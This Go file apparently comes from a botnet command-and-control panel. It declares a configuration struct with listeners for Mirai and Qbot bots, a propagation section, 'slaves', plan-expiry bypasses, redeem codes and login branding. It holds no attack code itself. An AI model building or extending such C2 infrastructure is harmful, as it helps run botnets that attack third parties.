package models 

//stores the configuration
//this will allow for certain customizing
type ConfigurationToml struct {
	Mirai struct {
		Enabled       bool   `toml:"enabled"`
		Listener      string `toml:"listener"`
		Banner        []int  `toml:"banner"`
		EnforceBanner bool   `toml:"enforce_banner"`
		MaxDupSupport int    `toml:"enforce_anti_dupe_cap"`
		ReadSleep     bool   `toml:"read_sleep"`
	} `toml:"mirai"`
	Qbot struct {
		Enabled            bool   `toml:"enabled"`
		Listener           string `toml:"listener"`
		Splitter           string `toml:"splitter"`
		PingActivity       bool   `toml:"ping_activity"`
		PingString         string `toml:"ping_string"`
		PingDelay          int    `toml:"ping_delay"`
		PingValid		   string `toml:"ping_valid"`
		RemoveUnresponsive bool   `toml:"remove_unresponsive"`
	} `toml:"qbot"`
	Propagation struct {
		Enabled  bool   `toml:"enabled"`
		Listener string `toml:"listener"`
		Whitelist []string `toml:"whitelist"`
	} `toml:"propagation"`
	Pointer struct {
		Enabled bool   `toml:"enabled"`
		Pointer string `toml:"pointer"`
		Write   string `toml:"write"`
	} `toml:"pointer"`
	Slaves struct {
		UseTable bool `toml:"use_table"`
	} `toml:"slaves"`
	AppSettings struct {
		AppName string `toml:"AppName"`
		CursorBlink bool `toml:"cursor_blinking"`
		NoCmds []string `toml:"blacklisted_commands"`
		ByPlan []string `toml:"bypass_planExpire"`
		Redeem []string `toml:"redeem"`
	} `toml:"AppSettings"`
	Itl struct {
		LiveEnabled			bool `toml:"auto_refresh"`
		TimeoutBetween      int  `toml:"sleep_between"`
		LiveBrandingRefresh bool `toml:"live_branding_refresh"`
		TomlBrandingRefresh bool `toml:"toml_branding_refresh"`
		JSONBrandingRefresh bool `toml:"json_branding_refresh"`
		Verbose             bool `toml:"verbose"`
		ReloadLimiter		bool `toml:"reload_limiter"`
	} `toml:"itl"`
	TitleWorker struct {
		Route    string `toml:"route"`
		TimeUnit string `toml:"timeUnit"`
		Duration int    `toml:"duration"`
	} `toml:"TitleWorker"`
	Login struct {
		Title string `toml:"title"`
		MaxUsernameInput int    `toml:"max_username_input"`
		MaxPasswordInput int    `toml:"max_password_input"`
		MaskingCharater  string `toml:"maskingCharater"`
	} `toml:"login"`
	Pager struct {
		RefreshPerLine bool `toml:"refreshPerLine"`
		Colours    []string `toml:"colours"`
	} `toml:"pager"`
	Terminal struct {
		DynamicTerminal bool `toml:"dynamic_terminal"`
	} `toml:"terminal"`
}